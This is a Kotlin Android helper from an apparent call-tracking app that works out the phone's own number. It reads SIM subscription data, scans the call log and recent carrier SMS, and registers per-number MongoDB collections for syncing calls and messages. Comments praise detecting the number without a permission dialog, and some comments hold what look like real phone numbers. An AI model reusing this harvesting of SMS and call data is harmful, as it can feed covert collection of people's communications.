package com.calltech

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.provider.CallLog
import android.provider.Settings
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.content.ContextCompat
import java.util.Locale

object SimNumberHelper {
    private const val TAG = "SimNumberHelper"
    private const val PREFS = "calltech_sim"
    private const val KEY_PRIMARY_SIM = "primary_sim_number"
    private const val KEY_MANUAL_SIM = "manual_sim_number"
    private const val KEY_SUB_NUMBER_PREFIX = "sub_number_"
    private const val APP_PREFIX = "calltech"
    private const val INVALID_SUBSCRIPTION = SubscriptionManager.INVALID_SUBSCRIPTION_ID

    fun sanitizeForCollection(simNumber: String): String {
        val trimmed = simNumber.trim()
        if (trimmed.startsWith("sim") || trimmed.startsWith("phone_")) {
            return trimmed.replace(Regex("[^a-zA-Z0-9_]"), "")
        }

        val digits = trimmed.replace(Regex("[^0-9]"), "")
        if (digits.isBlank()) {
            return "unknown"
        }

        // Indian SIM — collection name me sirf 10 digit (9114132962)
        if (digits.length >= 12 && digits.startsWith("91")) {
            return digits.takeLast(10)
        }
        if (digits.length == 11 && digits.startsWith("0")) {
            return digits.takeLast(10)
        }

        return digits
    }

    fun databaseName(@Suppress("UNUSED_PARAMETER") simNumber: String): String {
        val configured = BuildConfig.MONGODB_DB.trim()
        return configured.ifBlank { APP_PREFIX }
    }

    fun messagesCollection(simNumber: String): String {
        return "${sanitizeForCollection(simNumber)}-massage"
    }

    fun callLogsCollection(simNumber: String): String {
        return "${sanitizeForCollection(simNumber)}-call"
    }

    fun getCollectionPrefix(context: Context): String {
        return sanitizeForCollection(getBestKnownSimNumber(context))
    }

    fun getPrimarySimNumber(context: Context): String {
        getManualSimNumber(context)?.let { return it }

        val app = context.applicationContext
        val prefs = app.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        val cached = prefs.getString(KEY_PRIMARY_SIM, null)
            ?.takeIf { it.isNotBlank() }

        if (cached != null && isRealSimIdentity(cached)) {
            return cached
        }

        resolveBestRealSimNumber(app)?.let { resolved ->
            prefs.edit().putString(KEY_PRIMARY_SIM, resolved).apply()
            Log.d(TAG, "Primary SIM resolved: $resolved")
            return resolved
        }

        if (cached != null) {
            return cached
        }

        val fallback = fallbackDeviceIdentity(app)
        prefs.edit().putString(KEY_PRIMARY_SIM, fallback).apply()
        Log.d(TAG, "Primary SIM resolved: $fallback")
        return fallback
    }

    /** Hamesha asli 10-digit SIM number — phone_* tabhi jab kuch na mile. */
    fun getBestRealSimNumber(context: Context): String {
        return resolveBestRealSimNumber(context.applicationContext)
            ?: getPrimarySimNumber(context)
    }

    fun isRealPhoneNumber(simNumber: String): Boolean = isRealSimIdentity(simNumber)

    private fun resolveBestRealSimNumber(context: Context): String? {
        getManualSimNumber(context)?.let { return it }

        discoverAndCacheNumbers(context)
        discoverNumberFromRecentCarrierSms(context)

        defaultSubscriptionNumber(context)?.let { return it }
        getAllSimNumbers(context).firstOrNull()?.let { return it }
        getFirstCachedNumber(context)?.let { return it }

        discoverNumbersFromCallLog(context).values.firstOrNull()?.let { number ->
            cacheNumberForSubscription(context, null, number)
            return normalizeSimNumber(number)
        }

        BuildConfig.DEFAULT_SIM_NUMBER.trim().takeIf { isValidDiscoverableNumber(it) }
            ?.let { return normalizeSimNumber(it) }

        return null
    }

    private fun defaultSubscriptionNumber(context: Context): String? {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP_MR1) {
            return null
        }

        val candidates = listOf(
            SubscriptionManager.getDefaultSmsSubscriptionId(),
            SubscriptionManager.getDefaultDataSubscriptionId(),
            SubscriptionManager.getDefaultVoiceSubscriptionId(),
        ).filter { it != INVALID_SUBSCRIPTION }.distinct()

        for (subscriptionId in candidates) {
            getCachedNumberForSubscription(context, subscriptionId)?.let { return it }
            val fromSlot = readSimNumberForSubscription(context, subscriptionId)
            if (!fromSlot.isNullOrBlank() && isValidDiscoverableNumber(fromSlot)) {
                cacheNumberForSubscription(context, subscriptionId, fromSlot)
                return normalizeSimNumber(fromSlot)
            }
        }

        return null
    }

    fun getBestKnownSimNumber(context: Context): String {
        return getBestRealSimNumber(context)
    }

    /** SMS sync ke baad subscription ↔ number link karo — calls bhi sahi collection me jayenge. */
    fun linkSubscriptionToNumber(context: Context, subscriptionId: Int?, simNumber: String) {
        if (subscriptionId == null || subscriptionId == INVALID_SUBSCRIPTION) {
            return
        }
        if (!isRealSimIdentity(simNumber)) {
            return
        }
        cacheNumberForSubscription(context, subscriptionId, simNumber)
    }

    /** Call/SMS sync se pehle SIM number pakka karo — 9982669294-call jaisi collection ke liye. */
    fun ensureSimReadyForSync(context: Context): String {
        val app = context.applicationContext
        discoverAndCacheNumbers(app)
        discoverNumberFromRecentCarrierSms(app)
        val best = getBestRealSimNumber(app)
        Log.d(
            TAG,
            "SIM ready for sync: $best -> ${callLogsCollection(best)} / ${messagesCollection(best)}",
        )
        return best
    }

    /** Permissions / call log se number dubara dhundo — sim0 se upgrade. */
    fun refreshSimIdentity(context: Context): String {
        val app = context.applicationContext
        discoverAndCacheNumbers(app)
        app.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit()
            .remove(KEY_PRIMARY_SIM)
            .apply()
        val resolved = getPrimarySimNumber(context)
        Log.d(TAG, "SIM identity refreshed: $resolved")
        return resolved
    }

    /** Call/SMS sync ke dauran mila number cache karo. */
    fun noteDiscoveredNumber(context: Context, subscriptionId: Int?, rawNumber: String) {
        if (!isValidDiscoverableNumber(rawNumber)) {
            return
        }
        if (cacheNumberForSubscription(context, subscriptionId, rawNumber)) {
            Log.d(TAG, "Discovered SIM number: ${normalizeSimNumber(rawNumber)}")
        }
    }

    fun discoverAndCacheNumbers(context: Context): Boolean {
        var found = false
        for ((subscriptionId, number) in discoverNumbersFromCallLog(context)) {
            if (cacheNumberForSubscription(context, subscriptionId, number)) {
                found = true
            }
        }
        return found
    }

    fun getManualSimNumber(context: Context): String? {
        return context.applicationContext
            .getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .getString(KEY_MANUAL_SIM, null)
            ?.takeIf { it.isNotBlank() }
    }

    fun setManualSimNumber(context: Context, raw: String): String {
        val normalized = normalizeSimNumber(raw)
        val prefs = context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        prefs.edit()
            .putString(KEY_MANUAL_SIM, normalized)
            .remove(KEY_PRIMARY_SIM)
            .apply()

        Log.d(TAG, "Manual SIM saved: $normalized")
        return normalized
    }

    fun hasUsableSimNumber(context: Context): Boolean {
        return getPrimarySimNumber(context).isNotBlank()
    }

    fun registerSimInMongo(context: Context): Boolean {
        return registerOneSimInMongo(context, getBestKnownSimNumber(context))
    }

    /** Dual-SIM / multi-phone — har SIM ke liye alag collection (9982669294-call, etc). */
    fun registerAllSimsInMongo(context: Context): Boolean {
        val identities = getAllSimIdentities(context)
        val realNumbers = identities.filter { isRealPhoneNumber(it) }
        val toRegister = when {
            realNumbers.isNotEmpty() -> realNumbers
            identities.isNotEmpty() -> identities
            else -> listOf(getBestKnownSimNumber(context))
        }

        var any = false
        for (identity in toRegister.distinct()) {
            if (identity.isBlank()) {
                continue
            }
            if (registerOneSimInMongo(context, identity)) {
                any = true
            }
        }
        return any
    }

    /** Jio/Airtel/Vi SMS se apna number auto detect — bina permission dialog. */
    fun tryLearnNumberFromSmsBody(
        context: Context,
        sender: String,
        body: String,
        subscriptionId: Int?,
    ) {
        val ownNumber = extractOwnNumberFromText(body) ?: return
        noteDiscoveredNumber(context, subscriptionId, ownNumber)
        val prefs = context.applicationContext
            .getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        val current = prefs.getString(KEY_PRIMARY_SIM, null)
        if (current == null || !isRealSimIdentity(current) || current.startsWith("phone_")) {
            prefs.edit().putString(KEY_PRIMARY_SIM, normalizeSimNumber(ownNumber)).apply()
        }
        Log.d(TAG, "SIM number learned from SMS ($sender): $ownNumber")
    }

    private fun registerOneSimInMongo(context: Context, simNumber: String): Boolean {
        val prefix = sanitizeForCollection(simNumber)
        val now = System.currentTimeMillis()

        val messageDoc = hashMapOf<String, Any>(
            "id" to "sim_registration_${prefix}_message",
            "simNumber" to simNumber,
            "phoneNumber" to simNumber,
            "name" to "CallTech SIM",
            "body" to "SIM registered in MongoDB",
            "message" to "SIM registered in MongoDB",
            "type" to "REGISTRATION",
            "timestamp" to now,
            "syncedFrom" to "sim_register",
        )

        val callDoc = hashMapOf<String, Any>(
            "id" to "sim_registration_${prefix}_call",
            "simNumber" to simNumber,
            "phoneNumber" to simNumber,
            "name" to "CallTech SIM",
            "type" to "REGISTRATION",
            "duration" to 0L,
            "durationSeconds" to 0L,
            "durationFormatted" to "0s",
            "timestamp" to now,
            "rawType" to 0,
            "callAction" to "sim_registered",
            "callActionLabel" to "SIM registered",
            "hasRecording" to false,
            "recordingUrl" to "",
            "recordingDurationMs" to 0L,
            "recordingDurationFormatted" to "",
            "syncedFrom" to "sim_register",
        )

        val messagesOk = MongoSyncHelper.syncMessagesNow(context, listOf(messageDoc))
        val callsOk = MongoSyncHelper.syncCallLogsNow(context, listOf(callDoc))
        Log.d(TAG, "SIM registered in MongoDB ($simNumber): messages=$messagesOk calls=$callsOk")
        return messagesOk || callsOk
    }

    /** Har active SIM slot — number mile ya sim{subscriptionId} fallback. */
    fun getAllSimIdentities(context: Context): List<String> {
        getManualSimNumber(context)?.let { return listOf(it) }

        if (!hasPhonePermission(context) && !hasCallLogPermission(context)) {
            return listOf(fallbackDeviceIdentity(context))
        }

        discoverAndCacheNumbers(context)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            val subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
                as? SubscriptionManager

            val slots = subscriptionManager?.activeSubscriptionInfoList.orEmpty()
            if (slots.isNotEmpty()) {
                return slots.map { info ->
                    resolveIdentityForSubscription(context, info.subscriptionId)
                }.distinct()
            }
        }

        val numbers = getAllSimNumbers(context)
        if (numbers.isNotEmpty()) {
            return numbers.distinct()
        }

        val fromCallLog = discoverNumbersFromCallLog(context).values
            .map { normalizeSimNumber(it) }
            .distinct()
        if (fromCallLog.isNotEmpty()) {
            return fromCallLog
        }

        getFirstCachedNumber(context)?.let { return listOf(it) }

        return listOf(fallbackDeviceIdentity(context))
    }

    fun getSimNumberInfo(context: Context): Map<String, Any> {
        val manual = getManualSimNumber(context)
        val resolved = getPrimarySimNumber(context)
        val source = when {
            manual != null -> "manual"
            resolved.startsWith("sim") && !resolved.startsWith("+") -> "simslot"
            else -> "auto"
        }

        val deviceId = DeviceIdHelper.getDeviceId(context)
        val collectionPrefix = getCollectionPrefix(context)

        return mapOf(
            "simNumber" to resolved,
            "deviceId" to deviceId,
            "source" to source,
            "needsManualEntry" to false,
            "collectionPrefix" to collectionPrefix,
            "databaseName" to databaseName(resolved),
            "messagesCollection" to messagesCollection(resolved),
            "callLogsCollection" to callLogsCollection(resolved),
        )
    }

    fun getSimNumberForSubscription(context: Context, subscriptionId: Int?): String {
        if (subscriptionId == null || subscriptionId == INVALID_SUBSCRIPTION) {
            return getBestRealSimNumber(context)
        }

        val resolved = resolveIdentityForSubscription(context, subscriptionId)
        return if (isRealSimIdentity(resolved)) {
            resolved
        } else {
            getBestRealSimNumber(context)
        }
    }

    private fun resolveIdentityForSubscription(context: Context, subscriptionId: Int): String {
        getCachedNumberForSubscription(context, subscriptionId)?.let { return it }

        val fromSubscription = readSimNumberForSubscription(context, subscriptionId)
        if (!fromSubscription.isNullOrBlank() && isValidDiscoverableNumber(fromSubscription)) {
            val normalized = normalizeSimNumber(fromSubscription)
            cacheNumberForSubscription(context, subscriptionId, fromSubscription)
            return normalized
        }

        getFirstCachedNumber(context)?.let { return it }

        val prefs = context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        val primary = prefs.getString(KEY_PRIMARY_SIM, null)
            ?.takeIf { it.isNotBlank() && isRealSimIdentity(it) }
        if (primary != null) {
            return primary
        }

        resolveBestRealSimNumber(context)?.let { return it }

        return fallbackDeviceIdentity(context)
    }

    /** Jio/Airtel carrier SMS se number dhundo — recent inbox scan. */
    private fun discoverNumberFromRecentCarrierSms(context: Context): Boolean {
        if (!hasSmsPermission(context)) {
            return false
        }

        val carriers = setOf("JIO", "AIRTEL", "VI-", "BSNL", "IDEA", "VODAFONE")
        val cursor = try {
            context.contentResolver.query(
                android.provider.Telephony.Sms.CONTENT_URI,
                arrayOf(
                    android.provider.Telephony.Sms.ADDRESS,
                    android.provider.Telephony.Sms.BODY,
                    android.provider.Telephony.Sms.SUBSCRIPTION_ID,
                ),
                null,
                null,
                "${android.provider.Telephony.Sms.DATE} DESC LIMIT 80",
            )
        } catch (_: Exception) {
            null
        } ?: return false

        var found = false
        cursor.use { row ->
            val addressIndex = row.getColumnIndex(android.provider.Telephony.Sms.ADDRESS)
            val bodyIndex = row.getColumnIndex(android.provider.Telephony.Sms.BODY)
            val subIndex = row.getColumnIndex(android.provider.Telephony.Sms.SUBSCRIPTION_ID)
            if (addressIndex < 0 || bodyIndex < 0) {
                return false
            }

            var scanned = 0
            while (row.moveToNext() && scanned < 80) {
                scanned += 1
                val sender = row.getString(addressIndex)?.uppercase(Locale.US) ?: continue
                if (carriers.none { sender.contains(it) }) {
                    continue
                }
                val body = row.getString(bodyIndex) ?: continue
                val subId = if (subIndex >= 0) row.getInt(subIndex) else null
                val ownNumber = extractOwnNumberFromText(body) ?: continue
                noteDiscoveredNumber(context, subId, ownNumber)
                found = true
            }
        }

        if (found) {
            Log.d(TAG, "SIM number learned from carrier SMS inbox")
        }
        return found
    }

    private fun hasSmsPermission(context: Context): Boolean {
        return ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_SMS,
        ) == PackageManager.PERMISSION_GRANTED
    }

    fun getAllSimNumbers(context: Context): List<String> {
        getManualSimNumber(context)?.let { return listOf(it) }

        if (!hasPhonePermission(context)) {
            return emptyList()
        }

        val numbers = mutableListOf<String>()
        val telephony = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            val subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
                as? SubscriptionManager

            subscriptionManager?.activeSubscriptionInfoList?.forEach { info ->
                val number = readNumberForSubscription(context, subscriptionManager, telephony, info.subscriptionId)
                if (!number.isNullOrBlank()) {
                    numbers.add(normalizeSimNumber(number))
                }
            }
        }

        if (numbers.isEmpty() && telephony != null) {
            val line1 = telephony.line1Number?.takeIf { it.isNotBlank() }
            if (line1 != null) {
                numbers.add(normalizeSimNumber(line1))
            }
        }

        return numbers.distinct()
    }

    fun resolveSimNumberFromItem(
        context: Context,
        item: Map<String, Any>,
    ): String {
        ensureSimReadyForSync(context)

        val explicit = item["simNumber"]?.toString()?.takeIf { it.isNotBlank() }
        val normalizedExplicit = explicit?.let { normalizeSimNumber(it) }
        if (normalizedExplicit != null && isRealSimIdentity(normalizedExplicit)) {
            return normalizedExplicit
        }

        val subscriptionId = when (val raw = item["subscriptionId"]) {
            is Number -> raw.toInt()
            is String -> raw.toIntOrNull()
            else -> null
        }

        val fromSubscription = getSimNumberForSubscription(context, subscriptionId)
        if (isRealSimIdentity(fromSubscription)) {
            return normalizeSimNumber(fromSubscription)
        }

        val best = getBestRealSimNumber(context)
        return if (isRealSimIdentity(best)) {
            normalizeSimNumber(best)
        } else {
            fromSubscription
        }
    }

    private fun resolvePrimarySimNumber(context: Context): String {
        getManualSimNumber(context)?.let { return it }

        if (hasPhonePermission(context) || hasCallLogPermission(context)) {
            discoverAndCacheNumbers(context)

            getAllSimNumbers(context).firstOrNull()?.let { return it }

            getFirstCachedNumber(context)?.let { return it }

            discoverNumbersFromCallLog(context).values.firstOrNull()?.let { number ->
                cacheNumberForSubscription(context, null, number)
                return normalizeSimNumber(number)
            }

            fallbackSubscriptionSlot(context)?.let { return it }
        }

        return fallbackDeviceIdentity(context)
    }

    private fun fallbackDeviceIdentity(context: Context): String {
        val androidId = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ANDROID_ID,
        ) ?: "unknown"
        val suffix = androidId.takeLast(8).ifBlank { "unknown" }
        Log.d(TAG, "Using per-phone identity until SIM number detect: phone_$suffix")
        return "phone_$suffix"
    }

    private fun extractOwnNumberFromText(body: String): String? {
        val patterns = listOf(
            Regex("(?i)(?:your|aapka|apka|yours)?\\s*(?:jio|airtel|vi|bsnl|number|mobile|no\\.?)\\s*(?:is|:)?\\s*(?:\\+?91)?([6-9]\\d{9})"),
            Regex("(?i)(?:number|mobile|msisdn)\\s*(?:is|:)?\\s*(?:\\+?91)?([6-9]\\d{9})"),
            Regex("(?:\\+91|91)([6-9]\\d{9})"),
            Regex("(?:^|\\s)([6-9]\\d{9})(?:\\s|$)"),
        )

        for (pattern in patterns) {
            val match = pattern.find(body) ?: continue
            val digits = match.groupValues.lastOrNull()?.replace(Regex("\\D"), "") ?: continue
            if (digits.length >= 10) {
                return digits.takeLast(10)
            }
        }

        return null
    }

    private fun discoverNumbersFromCallLog(context: Context): Map<Int?, String> {
        if (!hasCallLogPermission(context)) {
            return emptyMap()
        }

        val result = linkedMapOf<Int?, String>()
        val uri: Uri = CallLog.Calls.CONTENT_URI
        val cursor = context.contentResolver.query(
            uri,
            null,
            null,
            null,
            "${CallLog.Calls.DATE} DESC",
        ) ?: return emptyMap()

        cursor.use { row ->
            if (!row.moveToFirst()) {
                return emptyMap()
            }

            var scanned = 0
            do {
                val addressIndex = row.getColumnIndex("phone_account_address")
                if (addressIndex < 0) {
                    continue
                }

                val ownNumber = row.getString(addressIndex)
                if (!isValidDiscoverableNumber(ownNumber)) {
                    continue
                }

                val subscriptionId = readSubscriptionIdFromCallRow(context, row)
                if (!result.containsKey(subscriptionId)) {
                    result[subscriptionId] = ownNumber!!
                }

                scanned += 1
            } while (row.moveToNext() && scanned < 300)
        }

        if (result.isNotEmpty()) {
            Log.d(TAG, "Numbers from call log: ${result.values.joinToString()}")
        }

        return result
    }

    private fun readSubscriptionIdFromCallRow(context: Context, row: android.database.Cursor): Int? {
        val accountIndex = row.getColumnIndex(CallLog.Calls.PHONE_ACCOUNT_ID)
        if (accountIndex >= 0) {
            when (val raw = row.getString(accountIndex)) {
                null, "" -> Unit
                else -> {
                    raw.toIntOrNull()?.let { return it }
                    matchSubscriptionId(context, raw)?.let { return it }
                }
            }
        }

        val subIndex = row.getColumnIndex("sub_id")
        if (subIndex >= 0 && !row.isNull(subIndex)) {
            return row.getInt(subIndex)
        }

        return null
    }

    private fun matchSubscriptionId(context: Context, raw: String): Int? {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP_MR1) {
            return null
        }

        val subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
            as? SubscriptionManager ?: return null

        subscriptionManager.activeSubscriptionInfoList?.forEach { info ->
            if (raw == info.subscriptionId.toString() || raw == info.iccId) {
                return info.subscriptionId
            }
        }

        return null
    }

    private fun getCachedNumberForSubscription(context: Context, subscriptionId: Int): String? {
        return context.applicationContext
            .getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .getString("$KEY_SUB_NUMBER_PREFIX$subscriptionId", null)
            ?.takeIf { it.isNotBlank() && !it.startsWith("sim") && !it.startsWith("phone_") }
    }

    private fun getFirstCachedNumber(context: Context): String? {
        val prefs = context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        prefs.all.forEach { (key, value) ->
            if (key.startsWith(KEY_SUB_NUMBER_PREFIX) && value is String && value.isNotBlank() &&
                !value.startsWith("sim") && !value.startsWith("phone_") && isRealSimIdentity(value)
            ) {
                return value
            }
        }
        return null
    }

    private fun cacheNumberForSubscription(
        context: Context,
        subscriptionId: Int?,
        rawNumber: String,
    ): Boolean {
        if (!isValidDiscoverableNumber(rawNumber)) {
            return false
        }

        val normalized = normalizeSimNumber(rawNumber)
        if (normalized.startsWith("sim")) {
            return false
        }

        val prefs = context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        val key = if (subscriptionId != null) {
            "$KEY_SUB_NUMBER_PREFIX$subscriptionId"
        } else {
            KEY_PRIMARY_SIM
        }

        val existing = prefs.getString(key, null)
        if (existing == normalized) {
            return false
        }

        val editor = prefs.edit().putString(key, normalized)
        val primary = prefs.getString(KEY_PRIMARY_SIM, null)
        if (primary == null || primary.startsWith("sim") || primary.startsWith("phone_")) {
            editor.putString(KEY_PRIMARY_SIM, normalized)
        }
        editor.apply()
        return true
    }

    private fun isValidDiscoverableNumber(raw: String?): Boolean {
        if (raw.isNullOrBlank()) {
            return false
        }

        val lower = raw.trim().lowercase()
        if (lower in setOf("unknown", "private", "restricted", "anonymous", "null", "hidden")) {
            return false
        }

        val digits = raw.replace(Regex("[^0-9]"), "")
        return digits.length >= 10
    }

    private fun hasCallLogPermission(context: Context): Boolean {
        return ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_CALL_LOG,
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun fallbackSubscriptionSlot(context: Context): String? {
        getFirstCachedNumber(context)?.let { return it }
        return fallbackDeviceIdentity(context)
    }

    private fun readNumberForSubscription(
        context: Context,
        subscriptionManager: SubscriptionManager,
        telephony: TelephonyManager?,
        subscriptionId: Int,
    ): String? {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            try {
                val number = subscriptionManager.getPhoneNumber(subscriptionId)
                if (!number.isNullOrBlank()) {
                    return number
                }
            } catch (error: SecurityException) {
                Log.w(TAG, "getPhoneNumber failed: ${error.message}")
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            val infoNumber = subscriptionManager.activeSubscriptionInfoList
                ?.firstOrNull { it.subscriptionId == subscriptionId }
                ?.let { info ->
                    @Suppress("DEPRECATION")
                    info.number
                }

            if (!infoNumber.isNullOrBlank()) {
                return infoNumber
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N && telephony != null) {
            try {
                val subTelephony = telephony.createForSubscriptionId(subscriptionId)
                val line1 = subTelephony.line1Number
                if (!line1.isNullOrBlank()) {
                    return line1
                }
            } catch (error: Exception) {
                Log.w(TAG, "createForSubscriptionId failed: ${error.message}")
            }
        }

        return readSimNumberForSubscription(context, subscriptionId)
    }

    private fun readSimNumberForSubscription(context: Context, subscriptionId: Int): String? {
        if (!hasPhonePermission(context) || Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP_MR1) {
            return null
        }

        val subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
            as? SubscriptionManager ?: return null

        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                subscriptionManager.getPhoneNumber(subscriptionId)
            } else {
                subscriptionManager.activeSubscriptionInfoList
                    ?.firstOrNull { it.subscriptionId == subscriptionId }
                    ?.number
            }
        } catch (error: SecurityException) {
            Log.w(TAG, "Could not read SIM for subscription $subscriptionId: ${error.message}")
            null
        }
    }

    private fun isRealSimIdentity(simNumber: String): Boolean {
        if (simNumber.startsWith("sim")) {
            return false
        }
        return sanitizeForCollection(simNumber).length >= 10
    }

    private fun normalizeSimNumber(raw: String): String {
        val trimmed = raw.trim()
        if (trimmed.startsWith("phone_")) {
            return trimmed
        }
        if (trimmed.startsWith("sim")) {
            return trimmed.replace(Regex("[^a-zA-Z0-9]"), "").ifBlank { fallbackDeviceIdentityUnsafe() }
        }

        val digits = trimmed.replace(Regex("[^0-9]"), "")
        if (digits.isBlank()) {
            return trimmed
        }

        return when {
            digits.length == 10 -> "+91$digits"
            digits.length == 12 && digits.startsWith("91") -> "+$digits"
            trimmed.startsWith("+") -> "+$digits"
            else -> "+$digits"
        }
    }

    private fun hasPhonePermission(context: Context): Boolean {
        val readPhoneState = ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_PHONE_STATE,
        ) == PackageManager.PERMISSION_GRANTED

        val readPhoneNumbers = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_PHONE_NUMBERS,
            ) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }

        return readPhoneState && readPhoneNumbers
    }

    private fun fallbackDeviceIdentityUnsafe(): String {
        return "phone_unknown"
    }
}
